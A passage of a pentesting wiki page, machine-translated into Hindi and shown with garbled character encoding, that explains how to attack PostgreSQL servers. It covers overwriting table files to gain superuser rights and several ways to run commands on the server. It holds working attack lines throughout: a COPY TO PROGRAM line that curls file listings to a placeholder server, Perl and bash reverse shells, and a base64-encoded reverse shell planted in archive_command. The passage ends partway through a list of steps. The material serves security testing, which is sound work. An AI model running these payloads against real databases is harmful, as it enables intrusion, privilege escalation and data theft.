{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдЯрд┐рдк**: **Intigriti** рдХреЗ рд▓рд┐рдП **рд╕рд╛рдЗрди рдЕрдк рдХрд░реЗрдВ**, рдПрдХ рдкреНрд░реАрдорд┐рдпрдо **рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдЬреЛ рд╣реИрдХрд░реНрд╕ рджреНрд╡рд╛рд░рд╛, рд╣реИрдХрд░реНрд╕ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ**! рдЖрдЬ рд╣реА [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) рдкрд░ рд╣рдорд╛рд░реЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ, рдФрд░ **$100,000** рддрдХ рдХреЗ рдмрд╛рдЙрдВрдЯреА рдХрдорд╛рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

{% embed url="https://go.intigriti.com/hacktricks" %}

### рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд▓реЗрдЦрди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ PostgreSQL рддрд╛рд▓рд┐рдХрд╛ рдбреЗрдЯрд╛ рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░рдирд╛

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ PostgreSQL рд╕рд░реНрд╡рд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдкрдврд╝рдиреЗ рдФрд░ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ, рддреЛ рдЖрдк **рд╕рдВрдмрдВрдзрд┐рдд рдлрд╝рд╛рдЗрд▓ рдиреЛрдб рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдХреЗ** рд╕рд░реНрд╡рд░ рдкрд░ рдХрд┐рд╕реА рднреА рддрд╛рд▓рд┐рдХрд╛ рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ [PostgreSQL рдбреЗрдЯрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ](https://www.postgresql.org/docs/8.1/storage.html)ред **рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА** [**рдпрд╣рд╛рдБ**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users)ред

рдЖрд╡рд╢реНрдпрдХ рдХрджрдо:

1.  PostgreSQL рдбреЗрдЯрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**рдиреЛрдЯ:** рдпрджрд┐ рдЖрдк рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рд╕реЗ рд╡рд░реНрддрдорд╛рди рдбреЗрдЯрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдкрде рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рдЕрд╕рдорд░реНрде рд╣реИрдВ, рддреЛ рдЖрдк `SELECT version()` рдХреНрд╡реЗрд░реА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рдореБрдЦ PostgreSQL рд╕рдВрд╕реНрдХрд░рдг рдХреЛ рдХреНрд╡реЗрд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдкрде рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред PostgreSQL рдХреЗ Unix рдЗрдВрд╕реНрдЯреЙрд▓реЗрд╢рди рдкрд░ рд╕рд╛рдорд╛рдиреНрдп рдбреЗрдЯрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдкрде рд╣реИрдВ `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`ред рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдХреНрд▓рд╕реНрдЯрд░ рдирд╛рдо рд╣реИ `main`ред
2.  рд▓рдХреНрд╖рд┐рдд рддрд╛рд▓рд┐рдХрд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдлрд╝рд╛рдЗрд▓ рдиреЛрдб рдХреЗ рд▓рд┐рдП рд╕рд╛рдкреЗрдХреНрд╖ рдкрде рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

рдпрд╣ рдХреНрд╡реЗрд░реА рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рд▓реМрдЯрд╛рдиреА рдЪрд╛рд╣рд┐рдП `base/3/1337`ред рдбрд┐рд╕реНрдХ рдкрд░ рдкреВрд░рд╛ рдкрде рд╣реЛрдЧрд╛ `$DATA_DIRECTORY/base/3/1337`, рдпрд╛рдиреА `/var/lib/postgresql/13/main/base/3/1337`ред
3.  `lo_*` рдлрд╝рдВрдХреНрд╢рдВрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдлрд╝рд╛рдЗрд▓ рдиреЛрдб рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```
4.  рд▓рдХреНрд╖рд┐рдд рддрд╛рд▓рд┐рдХрд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдбреЗрдЯрд╛ рдкреНрд░рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```
5.  [PostgreSQL рдлрд╝рд╛рдЗрд▓ рдиреЛрдб рд╕рдВрдкрд╛рджрдХ](https://github.com/adeadfed/postgresql-filenode-editor) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ [рдлрд╝рд╛рдЗрд▓ рдиреЛрдб рдХреЛ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); рд╕рднреА `rol*` рдмреВрд▓рд┐рдпрди рдлрд╝реНрд▓реИрдЧ рдХреЛ рдкреВрд░реНрдг рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП 1 рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВред

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL рдлрд╝рд╛рдЗрд▓ рдиреЛрдб рд╕рдВрдкрд╛рджрдХ рдбреЗрдореЛ](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo\_datatype.gif)
6.  рд╕рдВрдкрд╛рджрд┐рдд рдлрд╝рд╛рдЗрд▓ рдиреЛрдб рдХреЛ `lo_*` рдлрд╝рдВрдХреНрд╢рдВрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдлрд┐рд░ рд╕реЗ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ, рдФрд░ рдбрд┐рд╕реНрдХ рдкрд░ рдореВрд▓ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░реЗрдВ

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```
7.  _(рд╡реИрдХрд▓реНрдкрд┐рдХ)_ рдорд╣рдВрдЧреЗ SQL рдХреНрд╡реЗрд░реА рдХреЛ рдЪрд▓рд╛рдХрд░ рдЗрди-рдореЗрдореЛрд░реА рддрд╛рд▓рд┐рдХрд╛ рдХреИрд╢ рдХреЛ рд╕рд╛рдлрд╝ рдХрд░реЗрдВ

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```
8. рдЕрдм рдЖрдкрдХреЛ PostgreSQL рдореЗрдВ рдЕрдкрдбреЗрдЯ рдХреА рдЧрдИ рддрд╛рд▓рд┐рдХрд╛ рдорд╛рди рджрд┐рдЦрд╛рдИ рджреЗрдиреА рдЪрд╛рд╣рд┐рдПред

рдЖрдк `pg_authid` рддрд╛рд▓рд┐рдХрд╛ рдХреЛ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░рдХреЗ рд╕реБрдкрд░рдПрдбрдорд┐рди рднреА рдмрди рд╕рдХрддреЗ рд╣реИрдВред **рджреЗрдЦреЗрдВ** [**рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрдиреБрднрд╛рдЧ**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables)ред

## RCE

### **RCE рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЗ рд▓рд┐рдП**

рдЪреВрдВрдХрд┐ [рд╕рдВрд╕реНрдХрд░рдг 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html) рд╕реЗ, рдХреЗрд╡рд▓ **рд╕реБрдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдФрд░ **`pg_execute_server_program`** рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдп RCE рдХреЗ рд▓рд┐рдП рдХреЙрдкреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрд╢рди рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
рдЙрджрд╛рд╣рд░рдг exec рдХреЗ рд▓рд┐рдП:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк рд╕реБрдкрд░ рдпреВрдЬрд░ рдирд╣реАрдВ рд╣реИрдВ рд▓реЗрдХрд┐рди рдЖрдкрдХреЗ рдкрд╛рд╕ **`CREATEROLE`** рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ, рддреЛ рдЖрдк **рдЕрдкрдиреЗ рдЖрдк рдХреЛ рдЙрд╕ рд╕рдореВрд╣ рдХрд╛ рд╕рджрд╕реНрдп рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ:**
```sql
GRANT pg_execute_server_program TO username;
```
[**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реАред**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

рдпрд╛ **metasploit** рд╕реЗ `multi/postgres/postgres_copy_from_program_cmd_exec` рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред\
рдЗрд╕ рднреЗрджреНрдпрддрд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [**рдпрд╣рд╛рдВ**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5) рд╣реИред рдЬрдмрдХрд┐ рдЗрд╕реЗ CVE-2019-9193 рдХреЗ рд░реВрдк рдореЗрдВ рд░рд┐рдкреЛрд░реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, Postges рдиреЗ рдШреЛрд╖рдгрд╛ рдХреА рдХрд┐ рдпрд╣ рдПрдХ [рд╡рд┐рд╢реЗрд╖рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдареАрдХ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/)ред

### PostgreSQL рднрд╛рд╖рд╛рдУрдВ рдХреЗ рд╕рд╛рде RCE

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### PostgreSQL рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рд╛рде RCE

рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдк рдкрд┐рдЫрд▓реЗ рдкреЛрд╕реНрдЯ рд╕реЗ **рд╕реАрдЦ рдЪреБрдХреЗ рд╣реИрдВ** **рдХреИрд╕реЗ рдмрд╛рдЗрдирд░реА рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ** рддреЛ рдЖрдк **рдПрдХ рдкреЛрд╕реНрдЯрдЧреНрд░реЗрдПрд╕рдХреНрд▓ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдЕрдкрд▓реЛрдб рдХрд░рдХреЗ рдФрд░ рдЗрд╕реЗ рд▓реЛрдб рдХрд░рдХреЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### PostgreSQL рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ RCE

{% hint style="info" %}
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд RCE рд╡реЗрдХреНрдЯрд░ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╕реАрдорд┐рдд SQLi рд╕рдВрджрд░реНрднреЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реЛрддреЗ рд╣реИрдВ, рдХреНрдпреЛрдВрдХрд┐ рд╕рднреА рдЪрд░рдгреЛрдВ рдХреЛ рдиреЗрд╕реНрдЯреЗрдб SELECT рд╕реНрдЯреЗрдЯрдореЗрдВрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ
{% endhint %}

PostgreSQL рдХреА **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓** **postgres рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рджреНрд╡рд╛рд░рд╛ **рд▓рд┐рдЦреА рдЬрд╛ рд╕рдХрддреА рд╣реИ**, рдЬреЛ рдбреЗрдЯрд╛рдмреЗрд╕ рдЪрд▓рд╛ рд░рд╣рд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП **рд╕реБрдкрд░рдпреВрдЬрд░** рдХреЗ рд░реВрдк рдореЗрдВ, рдЖрдк рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдЗрд╕рд▓рд┐рдП рдЖрдк **рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред**

![](<../.gitbook/assets/image (322).png>)

#### **ssl_passphrase_command рдХреЗ рд╕рд╛рде RCE**

рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [рдпрд╣рд╛рдВ](https://pulsesecurity.co.nz/articles/postgres-sqli) рд╣реИред

рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдБ рд╣реИрдВ рдЬреЛ RCE рдХреА рдУрд░ рд▓реЗ рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` рдбреЗрдЯрд╛рдмреЗрд╕ рдХреА рдирд┐рдЬреА рдХреБрдВрдЬреА рдХрд╛ рдкрде
* `ssl_passphrase_command = ''` рдпрджрд┐ рдирд┐рдЬреА рдлрд╝рд╛рдЗрд▓ рдкрд╛рд╕рд╡рд░реНрдб рджреНрд╡рд╛рд░рд╛ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ (рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб) рддреЛ рдкреЛрд╕реНрдЯрдЧреНрд░реЗрдПрд╕рдХреНрд▓ рдЗрд╕ рд╡рд┐рд╢реЗрд╖рддрд╛ рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ **рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛**ред
* `ssl_passphrase_command_supports_reload = off` **рдпрджрд┐** рдпрд╣ рд╡рд┐рд╢реЗрд╖рддрд╛ **рдЪрд╛рд▓реВ** рд╣реИ рддреЛ рдпрджрд┐ рдХреБрдВрдЬреА рдкрд╛рд╕рд╡рд░реНрдб рджреНрд╡рд╛рд░рд╛ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ рддреЛ **рдХрдорд╛рдВрдб** рдирд┐рд╖реНрдкрд╛рджрд┐рдд **рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛** рдЬрдм `pg_reload_conf()` **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдлрд┐рд░, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА:

1. **рд╕рд░реНрд╡рд░ рд╕реЗ рдирд┐рдЬреА рдХреБрдВрдЬреА рдбрдВрдк рдХрд░реЗрдВ**
2. **рдбрд╛рдЙрдирд▓реЛрдб рдХреА рдЧрдИ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░реЗрдВ**:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░реЗрдВ**
4. рд╡рд░реНрддрдорд╛рди рдкреЛрд╕реНрдЯрдЧреНрд░реЗрдПрд╕рдХреНрд▓ **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди** рдХреЛ **рдбрдВрдк рдХрд░реЗрдВ**
5. рдЙрд▓реНрд▓реЗрдЦрд┐рдд рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рд╕рд╛рде **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди** рдХреЛ **рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░реЗрдВ**:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. `pg_reload_conf()` рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ

рдЬрдм рдореИрдВрдиреЗ рдЗрд╕рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд┐рдпрд╛, рддреЛ рдореИрдВрдиреЗ рджреЗрдЦрд╛ рдХрд┐ рдпрд╣ рдХреЗрд╡рд▓ рддрднреА рдХрд╛рдо рдХрд░реЗрдЧрд╛ рдЬрдм **рдирд┐рдЬреА рдХреБрдВрдЬреА рдлрд╝рд╛рдЗрд▓ рдХреЗ рдкрд╛рд╕ 640 рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реЛрдВ**, рдпрд╣ **рд░реВрдЯ** рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рдореЗрдВ рд╣реЛ рдФрд░ **рд╕рдореВрд╣ ssl-cert рдпрд╛ postgres** рджреНрд╡рд╛рд░рд╛ (рддрд╛рдХрд┐ postgres рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрд╕реЗ рдкрдврд╝ рд╕рдХреЗ), рдФрд░ рдЗрд╕реЗ _/var/lib/postgresql/12/main_ рдореЗрдВ рд░рдЦрд╛ рдЧрдпрд╛ рд╣реЛред

#### **archive_command рдХреЗ рд╕рд╛рде RCE**

**рдЗрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдФрд░ WAL рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ** [**рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдВ**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**ред**

рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдПрдХ рдФрд░ рд╡рд┐рд╢реЗрд╖рддрд╛ рдЬреЛ рд╢реЛрд╖рдг рдпреЛрдЧреНрдп рд╣реИ рд╡рд╣ рд╣реИ `archive_command`ред

рдЗрд╕рдХреЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, `archive_mode` рд╕реЗрдЯрд┐рдВрдЧ рдХреЛ `'on'` рдпрд╛ `'always'` рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрджрд┐ рдпрд╣ рд╕рддреНрдп рд╣реИ, рддреЛ рд╣рдо `archive_command` рдореЗрдВ рдХрдорд╛рдВрдб рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ WAL (write-ahead logging) рд╕рдВрдЪрд╛рд▓рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рд╕рд╛рдорд╛рдиреНрдп рдЪрд░рдг рд╣реИрдВ:

1. рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрд░реНрдХрд╛рдЗрд╡ рдореЛрдб рд╕рдХреНрд╖рдо рд╣реИ: `SELECT current_setting('archive_mode')`
2. рдкреЗрд▓реЛрдб рдХреЗ рд╕рд╛рде `archive_command` рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░реЗрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рдлрд┐рд░ рд╕реЗ рд▓реЛрдб рдХрд░реЗрдВ: `SELECT pg_reload_conf()`
4. WAL рд╕рдВрдЪрд╛рд▓рди рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░реЗрдВ, рдЬреЛ рдЖрд░реНрдХрд╛рдЗрд╡ рдХрдорд╛рдВрдб рдХреЛ рдХреЙрд▓ рдХрд░реЗрдЧрд╛: `SELECT pg_switch_wal()` рдпрд╛ рдХреБрдЫ PostgreSQL рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП `SELECT pg_switch_xlog()`

#### **preload рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЗ рд╕рд╛рде RCE**

рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [рдпрд╣рд╛рдВ](https://adeadfed.com/posts/postgresql-select-only-rce/) рд╣реИред

рдпрд╣ рд╣рдорд▓рд╛ рд╡реЗрдХреНрдЯрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рддрд╛ рд╣реИ:

* `session_preload_libraries` -- рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдЬреЛ PostgreSQL рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдХреНрд▓рд╛рдЗрдВрдЯ рдХрдиреЗрдХреНрд╢рди рдкрд░ рд▓реЛрдб рдХреА рдЬрд╛рдПрдВрдЧреАред
* `dynamic_library_path` -- рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреА рд╕реВрдЪреА рдЬрд╣рд╛рдВ PostgreSQL рд╕рд░реНрд╡рд░ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЗ рд▓рд┐рдП рдЦреЛрдЬ рдХрд░реЗрдЧрд╛ред

рд╣рдо `dynamic_library_path` рдорд╛рди рдХреЛ рдПрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рдбреЗрдЯрд╛рдмреЗрд╕ рдЪрд▓рд╛ рд░рд╣реЗ `postgres` рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рд▓рд┐рдЦреА рдЬрд╛ рд╕рдХреЗ, рдЬреИрд╕реЗ `/tmp/` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛, рдФрд░ рд╡рд╣рд╛рдВ рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг `.so` рдСрдмреНрдЬреЗрдХреНрдЯ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВред рдЕрдЧрд▓рд╛, рд╣рдо PostgreSQL рд╕рд░реНрд╡рд░ рдХреЛ рд╣рдорд╛рд░реЗ рдирдП рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░реЗрдВрдЧреЗ, рдЗрд╕реЗ `session_preload_libraries` рд╡реЗрд░рд┐рдПрдмрд▓ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдХрд░рдХреЗред

рд╣рдорд▓реЗ рдХреЗ рдЪрд░рдг рд╣реИрдВ:

1. рдореВрд▓ `postgresql.conf` рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ
2. `dynamic_library_path` рдорд╛рди рдореЗрдВ `/tmp/` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдВ, рдЬреИрд╕реЗ `dynamic_library_path = '/tmp:$libdir'`
